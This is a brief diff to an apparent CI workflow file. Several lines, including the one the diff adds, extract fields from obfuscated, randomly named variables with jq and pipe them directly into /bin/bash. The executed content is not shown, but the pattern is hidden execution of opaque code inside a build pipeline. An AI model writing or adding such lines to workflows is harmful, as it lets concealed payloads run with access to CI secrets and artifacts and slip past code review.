@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$oeqqd8" | jq -r .wmhp1880 | /bin/bash
           echo $c826 | jq -r .lqbd387 | /bin/bash
           echo $mg2 | jq -r .nu79 | /bin/bash
+          echo $qguv2 | jq -r .ndoab20 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
